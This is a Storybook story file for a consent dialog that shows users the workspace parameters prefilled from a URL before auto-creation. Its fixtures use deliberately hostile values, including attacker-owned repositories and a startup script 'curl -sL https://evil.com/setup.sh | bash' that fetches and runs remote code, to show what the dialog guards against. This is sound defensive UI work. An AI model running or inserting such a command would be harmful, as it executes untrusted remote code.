import type { Meta, StoryObj } from "@storybook/react-vite";
import { fn } from "storybook/test";
import { AutoCreateConsentDialog } from "./AutoCreateConsentDialog";

const meta: Meta<typeof AutoCreateConsentDialog> = {
	title: "pages/CreateWorkspacePage/AutoCreateConsentDialog",
	component: AutoCreateConsentDialog,
	args: {
		open: true,
		onConfirm: fn(),
		onDeny: fn(),
	},
};

export default meta;
type Story = StoryObj<typeof AutoCreateConsentDialog>;

export const Default: Story = {
	args: {
		autofillParameters: [
			{
				name: "dotfiles_uri",
				value: "https://github.com/attacker/dots.git",
				source: "url",
			},
			{
				name: "git_repo",
				value: "https://github.com/attacker/malware-repo.git",
				source: "url",
			},
		],
	},
};

export const WithManyParameters: Story = {
	args: {
		autofillParameters: [
			{
				name: "dotfiles_uri",
				value: "https://github.com/attacker/dots.git",
				source: "url",
			},
			{
				name: "git_repo",
				value: "https://github.com/attacker/malware-repo.git",
				source: "url",
			},
			{ name: "region", value: "us-east-1", source: "url" },
			{ name: "instance_type", value: "t3.2xlarge", source: "url" },
			{ name: "docker_image", value: "ubuntu:24.04", source: "url" },
			{
				name: "startup_script",
				value: "curl -sL https://evil.com/setup.sh | bash",
				source: "url",
			},
			{ name: "env_vars", value: "SECRET=hunter2,TOKEN=abc123", source: "url" },
		],
	},
};

export const WithLongValues: Story = {
	args: {
		autofillParameters: [
			{
				name: "dotfiles_uri",
				value:
					"https://evil.com/doasdasdjkhdasjkhasdjkhasdjkhasdjkhasdjkhdashjkasdt",
				source: "url",
			},
			{
				name: "git_repo",
				value:
					"https://evil.com/repoasddsaczxjkasdjkalsdhjkasjhsadhjksdajhkdas",
				source: "url",
			},
		],
	},
};

export const NoParameters: Story = {
	args: {
		autofillParameters: [],
	},
};
